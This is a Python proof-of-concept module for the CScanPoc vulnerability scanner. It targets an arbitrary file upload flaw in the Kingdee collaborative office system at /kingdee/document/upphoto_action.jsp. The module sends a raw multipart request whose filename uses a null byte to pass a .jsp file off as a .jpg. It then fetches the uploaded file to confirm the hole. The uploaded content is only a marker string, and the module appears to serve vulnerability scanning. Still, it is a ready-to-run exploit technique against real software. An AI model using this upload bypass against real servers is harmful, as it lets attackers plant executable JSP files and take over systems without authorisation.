# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'kingdee_0011'  # 平台漏洞编号，留空
    name = '金蝶协同办公系统 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        金蝶协同办公管理系统助力企业实现从分散到协同，规范业务流程、降低运作成本，提高执行力，并成为领导的工作助手、员工工作和沟通的平台。
        金蝶协同办公系统 /kingdee/document/upphoto_action.jsp 可上传任意文件。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金蝶协同办公系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '74951df5-0499-4aa7-a978-7165d4499e1f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            raw = '''
POST /kingdee/document/upphoto_action.jsp HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
'''
            raw += "Referer: {}/kingdee/document/upphoto.jsp".format(
                self.target)
            raw += '''
Cookie: JSESSIONID=abcHHjTI8tbcX9b1h5Ggv
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------2984167512327
Content-Length: 219

-----------------------------2984167512327
'''
            raw += "Content-Disposition: form-data; name=\"photo\"; filename=\"testvul.jsp" + \
                chr(0) + ".jpg\""
            raw += '''
Content-Type: image/jpeg

testvul_file_upload_test
-----------------------------2984167512327--

    '''
            url = self.target + '/kingdee/document/upphoto_action.jsp'
            # proxy=('127.0.0.1',1234)
            # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
            code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
            shell_path = '/kingdee/document/photo/testvul.jsp'
            code2, head2, res2, errcode2, _url2 = hh.http(
                self.target + shell_path)
            if code2 == 200 and 'testvul_file_upload_test' in res2:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
